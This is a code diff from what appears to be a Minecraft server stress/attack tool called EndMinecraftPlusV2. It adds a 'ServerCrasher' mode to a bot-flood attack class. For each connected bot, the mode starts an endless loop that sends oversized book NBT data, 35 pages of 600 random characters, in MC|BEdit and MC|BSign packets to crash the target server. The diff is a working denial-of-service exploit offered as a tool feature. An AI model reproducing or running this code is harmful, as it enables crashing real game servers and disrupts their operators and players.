@@ -6,6 +6,7 @@ import cn.serendipityr.EndMinecraftPlusV2.VersionControl.*;
 import cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.ACProtocol.AnotherStarAntiCheat;
 import cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.ACProtocol.AntiCheat3;
 import cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.ForgeProtocol.MCForge;
+import com.github.steveice10.mc.protocol.data.game.entity.metadata.ItemStack;
 import com.github.steveice10.mc.protocol.data.message.Message;
 import com.github.steveice10.mc.protocol.packet.ingame.client.ClientChatPacket;
 import com.github.steveice10.mc.protocol.packet.ingame.client.ClientKeepAlivePacket;
@@ -23,9 +24,15 @@ import com.github.steveice10.mc.protocol.packet.ingame.server.entity.player.Serv
 import com.github.steveice10.mc.protocol.packet.ingame.serverbound.ServerboundCustomPayloadPacket;
 import com.github.steveice10.mc.protocol.packet.ingame.serverbound.ServerboundKeepAlivePacket;
 import com.github.steveice10.mc.protocol.packet.ingame.serverbound.player.ServerboundMovePlayerStatusOnlyPacket;
+import com.github.steveice10.opennbt.NBTIO;
+import com.github.steveice10.opennbt.tag.builtin.CompoundTag;
+import com.github.steveice10.opennbt.tag.builtin.ListTag;
+import com.github.steveice10.opennbt.tag.builtin.StringTag;
+import com.github.steveice10.opennbt.tag.builtin.Tag;
 import com.github.steveice10.packetlib.ProxyInfo;
 import com.github.steveice10.packetlib.Session;
 import com.github.steveice10.packetlib.event.session.*;
+import com.github.steveice10.packetlib.io.stream.StreamNetOutput;
 import com.github.steveice10.packetlib.packet.Packet;
 import io.netty.util.internal.ConcurrentSet;
 import net.kyori.adventure.text.Component;
@@ -33,6 +40,7 @@ import net.kyori.adventure.text.serializer.ComponentSerializer;
 import net.kyori.adventure.text.serializer.gson.GsonComponentSerializer;
 import net.kyori.adventure.text.serializer.plain.PlainTextComponentSerializer;
 
+import java.io.ByteArrayOutputStream;
 import java.io.OutputStream;
 import java.net.InetSocketAddress;
 import java.net.Proxy;
@@ -129,6 +137,44 @@ public class NewBotAttack extends IAttack {
                                                 throw new RuntimeException(e);
                                             }
                                         }).start();
+                                    }
+                                }
+                            }
+
+                            if (ConfigUtil.ServerCrasher && !c.hasFlag("crasher")) {
+                                c.setFlag("crasher", true);
+
+                                if (ProtocolLibs.adaptAfter758) {
+
+                                } else {
+                                    switch (ConfigUtil.ServerCrasherMode) {
+                                        case 1:
+                                            new Thread(() -> {
+                                                LogUtil.doLog(0, "[" + clientName.get(c) + "] 开始发送Crash Packet...", "ServerCrasher");
+
+                                                while (true) {
+                                                    try {
+                                                        ItemStack crashBook = getCrashBook();
+
+                                                        ByteArrayOutputStream buf = new ByteArrayOutputStream();
+                                                        StreamNetOutput out = new StreamNetOutput(buf);
+
+                                                        out.writeShort(crashBook.getId());
+                                                        out.writeByte(crashBook.getAmount());
+
+                                                        NBTIO.writeTag(buf, crashBook.getNbt());
+
+                                                        byte[] crashData = buf.toByteArray();
+
+                                                        c.send(new ClientPluginMessagePacket("MC|BEdit", crashData));
+                                                        c.send(new ClientPluginMessagePacket("MC|BSign", crashData));
+
+                                                        Thread.sleep(ConfigUtil.ServerCrasherPacketDelay);
+                                                    } catch (Exception ignored) {}
+                                                }
+                                            }).start();
+                                            break;
+                                        default:
                                     }
                                 }
                             }
@@ -605,5 +651,24 @@ public class NewBotAttack extends IAttack {
                 LogUtil.doLog(0, "[服务端返回信息] [" + username + "] " + result.get("msg"), "BotAttack");
             }
         }
+    }
+
+    public static ItemStack getCrashBook() {
+        ItemStack crashBook = null;
+        CompoundTag nbtTag = new CompoundTag("crashBook");
+        List<Tag> pageList = new ArrayList<>();
+
+        // Plain Mode
+        nbtTag.put(new StringTag("author", OtherUtils.getRandomString(20, 20)));
+        nbtTag.put(new StringTag("title", OtherUtils.getRandomString(20, 20)));
+
+        for (int a = 0; a < 35; a++) {
+            pageList.add(new StringTag("", OtherUtils.getRandomString(600, 600)));
+        }
+
+        nbtTag.put(new ListTag("pages", pageList));
+        crashBook = new ItemStack(386, 1, nbtTag);
+
+        return crashBook;
     }
 }
